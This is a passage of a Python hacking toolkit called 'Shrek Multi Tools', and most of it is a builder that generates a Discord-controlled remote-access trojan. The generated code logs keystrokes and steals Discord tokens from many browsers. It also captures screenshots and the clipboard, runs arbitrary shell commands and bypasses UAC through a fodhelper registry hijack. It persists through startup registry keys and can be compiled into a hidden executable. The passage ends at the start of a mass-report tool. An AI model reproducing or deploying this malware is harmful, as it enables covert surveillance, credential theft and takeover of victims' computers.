{Fore.GREEN}> {Fore.WHITE}MASE REPORT: Comming Soon...
            """)
    else:
        print('Invalid Option')

    while __name__ == '__main__' and Setting not in ['0','00']:
      print(Fore.WHITE)
      os.system('pause')
      settings()

  def init():
    pass  # Ajoutez le contenu de la fonction init() si nécessaire

  def idtotoken():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Id To Token")
    print(f'''
{Fore.GREEN}
  ██ ▓█████▄     ▄███████▓ ▒█████      ▄███████▓ ▒█████   ▀██ ▄█▀▓█████ ███▄    █ 
▒▓██ ▒██▀ ██▌    ▓  ██▒ ▓▒▒██▒  ██▒    ▓  ██▒ ▓▒▒██▒  ██▒  ██▄█▒ ▓█   ▀ ██ ▀█   █ 
░▒██ ░██   █▌    ▒ ▓██░ ▒░▒██░  ██▒    ▒ ▓██░ ▒░▒██░  ██▒ ▓███▄░ ▒███  ▓██  ▀█ ██▒
 ░██▒░▓█▄   ▌    ░ ▓██▓ ░ ▒██   ██░    ░ ▓██▓ ░ ▒██   ██░ ▓██ █▄ ▒▓█  ▄▓██▒  ▐███▒
 ░██░░▒████▓       ▒██▒ ░ ░ ████▓▒░      ▒██▒ ░ ░ ████▓▒░ ▒██▒ █▄░▒████▒██░   ▓██░
 ░▓ ░ ▒▒▓  ▒       ▒ ░░   ░ ▒░▒░▒░       ▒ ░░   ░ ▒░▒░▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒░   ▒ ▒ 
  ▒   ░ ▒  ▒         ░      ░ ▒ ▒░         ░      ░ ▒ ▒░  ░ ░▒ ▒░ ░ ░  ░ ░░   ░ ▒░
  ▒   ░ ░  ░       ░ ░    ░ ░ ░ ▒        ░ ░    ░ ░ ░ ▒   ░ ░░ ░    ░     ░   ░ ░ 
  ░     ░                     ░ ░                   ░ ░   ░  ░      ░           ░ 
    ''')

    init()

    userid = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the User's ID?: ''')
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")

    print(f'\n  FIRST PART : {encodedStr}')

  global discordrat
  def discordrat():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Discord Rat Bot") 
    print(f"""
{Fore.GREEN}
 ██▀███   ▄▄▄     ▄▄▄█████▓      ▄▄▄▄    ▒█████  ▄▄▄█████▓
▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒     ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░     ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░      ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
░██▓ ▒██▒ ▓█   ▓██  ▒██▒ ░     ▒░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
░ ▒▓ ░▒▓░ ▒▒   ▓▒█  ▒ ░░       ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
  ░▒ ░ ▒░  ░   ▒▒     ░        ░▒░▒   ░   ░ ▒ ▒░     ░    
   ░   ░   ░   ▒    ░ ░          ░    ░ ░ ░ ░ ▒    ░ ░    
   ░           ░               ░ ░          ░ ░           

        """)
    def spinner():
        l= ['|', '/', '-', '\\']
        for i in l+l:
            sys.stdout.write(f"""\rCreating File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)
        print('\n')
        for i in l+l+l+l:
            sys.stdout.write(f"""\rWriting File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)

    global filename
    fileName = str(input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}File name: """))
    global tokenbot
    tokenbot = str(input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Bot Token: """))
    guildid = str(input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Guild ID: """))
    print('\n')
    spinner()
    if not os.path.exists("output"):
        os.makedirs("output")
        
    try:
        with open(f" <*> output/{fileName}.py", "w", encoding="utf-8") as file:
            file.write("""import discord 
import json 
import subprocess 
import asyncio 
import ctypes 
import os 
import logging 
import threading 
import requests 
import time 
import win32clipboard
import win32process
import win32con
import win32gui
import winreg
import re
import sys
import shutil
import pyautogui

from urllib.request import urlopen, urlretrieve
from time import sleep
from mss import mss
from pynput.keyboard import Listener
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

from discord_components import *

from discord.ext import commands
from discord_slash.context import ComponentContext
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component

client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\\'s')
slash = SlashCommand(client, sync_commands=True)

token = '~~TOKENHERE~~'

@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('You do not have permission to execute this command')
    else:
        print(error)

@client.event
async def on_command_error(cmd, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        pass

async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0
    with urlopen("http://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        ip = data['ip']
        country = data['country']
        city = data['city']

    process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    wtype = process2.communicate()[0].decode().strip("Caption\\n").strip()

    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here ✔ New session, opened **{channel_name}** | **{wtype}** | **{ip}, {country}/{city}**\\n> Succesfully gained access to user **`{os.getlogin()}`**"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** perms')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def MuteVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)


@slash.slash(name="kill", description="kills all inactive sessions", guild_ids=g)
async def kill_command(ctx: SlashContext):
    for y in range(len(on_ready.total)): 
        if "session" in on_ready.total[y]:
            channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
            await channel_to_delete.delete()
        else:
            pass
    await ctx.send(f"Killed all the inactive sessions")


@slash.slash(name="exit", description="stop the program on victims pc", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="✔"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="X"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "✔":
            await ctx.send(content="Exited the program!", hidden=True)
            os._exit(0)
        else:
            await ctx.send(content="Cancelled the exit", hidden=True)


@slash.slash(name="info", description="gather info about the user", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
        googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\\n").strip()
        process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wtype = process2.communicate()[0].decode().strip("Caption\\n").strip()

        userdata = f"```fix\\n------- {os.getlogin()} -------\\nComputername: {os.getenv('COMPUTERNAME')}\\nIP: {data['ip']}\\nUsing VPN?: {UsingVPN}\\nOrg: {data['org']}\\nCity: {data['city']}\\nRegion: {data['region']}\\nPostal: {data['postal']}\\nWindowskey: {wkey}\\nWindows Type: {wtype}\\n```**Map location: {googlemap}**\\n"
        await ctx.send(userdata)


@slash.slash(name="startkeylogger", description="start a key logger on their pc", guild_ids=g)
async def startKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                level=logging.DEBUG, format='%%(asctime)s: %%(ctx)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            global logger
            logger = threading.Thread(target=keylog)
            logger._running = True
            logger.daemon = True
            logger.start()
            await ctx.send("Keylogger Started!")


@slash.slash(name="stopkeylogger", description="stop the key logger", guild_ids=g)
async def stopKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        logger._running = False
        await ctx.send("Keylogger Stopped!")


@slash.slash(name="KeyLogDump", description="dumb the keylogs", guild_ids=g)
async def KeyLogDump_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        file_keys = os.path.join(os.getenv("TEMP") + "\\key_log.txt")
        file = discord.File(file_keys, filename=file_keys)
        await ctx.send("Successfully dumped all the logs", file=file)
        os.remove(file_keys)


@slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
async def TokenExtractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"extracting tokens...")
        tokens = []
        saved = ""
        paths = {
            'Discord': os.getenv('APPDATA') + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',
            'Discord Canary': os.getenv('APPDATA') + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',
            'Lightcord': os.getenv('APPDATA') + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',
            'Discord PTB': os.getenv('APPDATA') + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',
            'Opera': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',
            'Opera GX': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',
            'Amigo': os.getenv('LOCALAPPDATA') + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Torch': os.getenv('LOCALAPPDATA') + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Kometa': os.getenv('LOCALAPPDATA') + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Orbitum': os.getenv('LOCALAPPDATA') + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            '7Star': os.getenv('LOCALAPPDATA') + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Sputnik': os.getenv('LOCALAPPDATA') + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Chrome': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',
            'Uran': os.getenv('LOCALAPPDATA') + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Yandex': os.getenv('LOCALAPPDATA') + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Brave': os.getenv('LOCALAPPDATA') + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Iridium': os.getenv('LOCALAPPDATA') + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'
        }
        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        for token in tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                "Authorization": token
            })
            if r.status_code == 200:
                if token in saved:
                    continue
                saved += f"`{token}`\\n\\n"
        if saved != "":
            await ctx.send(f"**Token(s) succesfully grabbed:** \\n{saved}")
        else:
            await ctx.send(f"**User didn't have any stored tokens**")


@slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
async def windowstart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = False

        threading.Thread(target=between_callback, args=(client,)).start()
        await ctx.send("Window logging for this session started")


@slash.slash(name="windowstop", description="stop window logger", guild_ids=g)
async def windowstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = True

        await ctx.send("Window logging for this session stopped")
        game = discord.Game(f"Window logging stopped")
        await client.change_presence(status=discord.Status.online, activity=game)


def change_res(cap, width, height):
    cap.set(3, width)
    cap.set(4, height)

def get_dims(cap, res='1080p'):
    STD_DIMENSIONS =  {
        "480p": (640, 480),
        "720p": (1280, 720),
        "1080p": (1920, 1080),
        "4k": (3840, 2160),
    }
    width, height = STD_DIMENSIONS["480p"]
    if res in STD_DIMENSIONS:
        width,height = STD_DIMENSIONS[res]
    change_res(cap, width, height)
    return width, height

@slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
async def screenshot_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        temp = os.path.join(os.getenv('TEMP') + "\\\\monitor.png")
        with mss() as sct:
            sct.shot(output=temp)
        file = discord.File(temp, filename="monitor.png")
        await ctx.send("Screenshot taken!", file=file)
        os.remove(temp)


@slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
async def MaxVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MaxVolume()
        await ctx.send("Volume set to **100%**")


@slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
async def MuteVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MuteVolume()
        await ctx.send("Volume set to **0%**")


@slash.slash(name="Wallpaper", description="Change their wallpaper", guild_ids=g)
async def Wallpaper_command(ctx: SlashContext, link: str):
    if ctx.channel.name == channel_name:
        if re.match(r'^(?:http|ftp)s?://', link) is not None:
            image_formats = ("image/png", "image/jpeg", "image/jpg", "image/x-icon",)
            r = requests.head(link)
            if r.headers["content-type"] in image_formats:
                path = os.path.join(os.getenv('TEMP') + "\\\\temp.jpg")
                urlretrieve(link, path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                await ctx.send(f"Successfully Changed their wallpaper to:\\n{link}")
            else:
                await ctx.send("Link needs to be a url to an image!")
        else:
            await ctx.send("Invalid link!")


@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
async def Shell_command(ctx: SlashContext, command: str):
    if ctx.channel.name == channel_name:
        def shell():
            output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            return output

        shel = threading.Thread(target=shell)
        shel._running = True
        shel.start()
        sleep(1)
        shel._running = False

        result = str(shell().stdout.decode('CP437'))
        numb = len(result)

        if result != "":
            if numb < 1:
                await ctx.send("unrecognized command or no output was obtained")
            elif numb > 1990:
                f1 = open("output.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File("output.txt", filename="output.txt")

                await ctx.send("Command successfully executed", file=file)
                os.remove("output.txt")
            else:
                await ctx.send(f"Command successfully executed:\\n```\\n{result}```")
        else:
            await ctx.send("unrecognized command or no output was obtained")

@slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
async def Write_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        await ctx.send(f"Typing. . .")
        for letter in message:
            pyautogui.typewrite(letter);sleep(0.0001)
        await ctx.send(f"Done typing\\n```\\n{message}```")


@slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
async def Clipboard_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await ctx.send(f"Their Current Clipboard is:\\n```{data}```")


@slash.slash(name="AdminCheck", description=f"check if DiscordRAT has admin perms", guild_ids=g)
async def AdminCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            embed = discord.Embed(title="AdminCheck", description=f"DiscordRAT Has Admin privileges!")
            await ctx.send(embed=embed)
        else:
            embed=discord.Embed(title="AdminCheck",description=f"DiscordRAT does not have admin privileges")
            await ctx.send(embed=embed)


@slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
async def IdleTime_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [
                ('cbSize', ctypes.c_uint),
                ('dwTime', ctypes.c_int),
            ]
        def get_idle_duration():
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
                millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                return millis / 1000
            else:
                return 0
        duration = get_idle_duration()
        await ctx.send(f"**{os.getlogin()}'s** been idle for {duration} seconds.")


@slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
async def BlockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            await ctx.send(f"Blocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")


@slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
async def UnblockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send(f"Unblocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")
            

@slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
async def MessageBox_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        def msgbox(message, type):
            return ctypes.windll.user32.MessageBoxW(0, message, "Attention!", type | 0x1000)

        select = create_select(
        options=[
            create_select_option(label="Error", value="Errors", emoji="X"),
            create_select_option(label="Warning", value="Warnings", emoji="⚠"),
            create_select_option(label="Info", value="Infos", emoji="ℹ"),
            create_select_option(label="Question", value="Questions", emoji="?"),
        ],
        placeholder="Choose your type", 
        min_values=1,
        max_values=1,
    )   
        await ctx.send("What type of messagebox do you want to popup?", components=[create_actionrow(select)])

        select_ctx: ComponentContext = await wait_for_component(client, components=[create_actionrow(select)])
        if select_ctx.selected_options[0] == 'Errors':
            threading.Thread(target=msgbox, args=(message, 16)).start()
            await select_ctx.edit_origin(content=f"Sent an Error Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Warnings':
            threading.Thread(target=msgbox, args=(message, 48)).start()
            await select_ctx.edit_origin(content=f"Sent an Warning Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Infos':
            threading.Thread(target=msgbox, args=(message, 64)).start()
            await select_ctx.edit_origin(content=f"Sent an Info Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Questions':
            threading.Thread(target=msgbox, args=(message, 32)).start()
            await select_ctx.edit_origin(content=f"Sent an Question Message Asking {message}")


@slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
async def Play_command(ctx: SlashContext, youtube_link: str):
    if ctx.channel.name == channel_name:
        MaxVolume()
        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                        else:
                            pass
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
        else:
            await ctx.send("Invalid Youtube Link")

@slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
async def Stop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        ctx.send("stopped the music")
        os.system(f"taskkill /F /IM {pid_process[1]}")


@slash.slash(name="AdminForce", description="try and bypass uac and get admin rights", guild_ids=g)
async def AdminForce_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"attempting to get admin privileges. . .")
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == False:
            os.system(\"""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force\""")
            os.system(\"""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force\""") 
            os.system(\"""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start\""" + sys.argv[0] +"-Force")
            
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            with disable_fsr():
                os.system("fodhelper.exe")

            sleep(2)
            os.system(\"""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force\""")
        else:
            await ctx.send("You already have admin privileges")


@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
async def Startup_command(ctx: SlashContext, reg_name: str):
    if ctx.channel.name == channel_name:
        try:
            key1 = winreg.HKEY_CURRENT_USER
            key_value1 ="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)

            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
            open_.Close()
            await ctx.send("Successfully added it to `run` startup")
        except PermissionError:
            shutil.copy(sys.argv[0], os.getenv("appdata")+"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+os.path.basename(sys.argv[0]))
            await ctx.send("Permission was denied, added it to `startup folder` instead")

client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid + "]"))


    except Exception as e:
        print(f"""\n\n\n\n {Fore.MAGENTA}[{Fore.WHITE}INFO{Fore.MAGENTA}] {Fore.WHITE} Error writing file: {e}""")
        clear()

    print(f"""\n\n\n {Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}] {Fore.WHITE}File has been correctly written to "output/{fileName}.py" """)
    convert = input(f""" {Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Convert your script into an executable {Fore.GREEN}({Fore.WHITE}Y{Fore.GREEN}/{Fore.WHITE}N{Fore.GREEN}){Fore.WHITE}? : """)
    if convert.upper() == 'Y' or convert.upper() == 'YES':
        try:
            time.sleep(1)
            clear()

            print(f' {Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}] {Fore.WHITE}File creation...')
            time.sleep(1)
            os.system(f"pyinstaller --onefile --noconsole -y -F -w output/{fileName}.py")
            clear()
            print(f' {Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}] {Fore.WHITE}Cleaning up old files...')
            time.sleep(1)
            try:
                import shutil
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.move(f"output/dist/{fileName}.exe", "output")
                shutil.rmtree(f"output/dist")
                time.sleep(1)
            except:
                pass
            clear()
            print(f" {Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}] {Fore.WHITE}The executable file has been correctly generated")
        except:
            clear()
            print(f" {Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}] {Fore.WHITE}The executable file has been correctly generated")

  def massreport():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Mass Report") 
    print(f"""
{Fore.GREEN}
  ███▄ ▄███▓ ▄▄▄       ██████   ██████      ██▀███  ▓█████ ██▓███   ▒█████   ██▀███  ▄▄▄█████▓
 ▓██▒▀█▀ ██▒▒████▄   ▒██    ▒ ▒██    ▒     ▓██ ▒ ██▒▓█   ▀▓██░  ██ ▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒
 ▓██    ▓██░▒██  ▀█▄ ░ ▓██▄   ░ ▓██▄       ▓██ ░▄█ ▒▒███  ▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░
 ▒██    ▒██ ░██▄▄▄▄██  ▒   ██▒  ▒   ██▒    ▒██▀▀█▄  ▒▓█  ▄▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ 
▒▒██▒   ░██▒ ▓█   ▓██▒██████▒▒▒██████▒▒    ░██▓ ▒██▒░▒████▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░ 
░░ ▒░   ░  ░ ▒▒   ▓▒█▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░    ░ ▒▓ ░▒▓░░░ ▒░ ▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░   
░░  ░      ░  ░   ▒▒ ░ ░▒  ░  ░ ░▒  ░        ░▒ ░ ▒░ ░ ░  ░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░    ░    
 ░      ░     ░   ▒  ░  ░  ░  ░  ░  ░         ░   ░    ░  ░░       ░ ░ ░ ▒     ░   ░   ░ ░    
░       ░         ░        ░        ░         ░        ░               ░ ░     ░              

        """)
    print(f"{Fore.GREEN}({Fore.WHITE}the token you enter is the account that will send the reports{Fore.GREEN})")
    token = input(
        f' {Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Token:{Fore.WHITE} ')
    validateToken(token)
    guild_id1 = str(input(
        f' {Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Server ID:{Fore.WHITE} '))
    channel_id1 = str(input(
        f' {Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Salon ID:{Fore.WHITE} '))
    message_id1 = str(input(
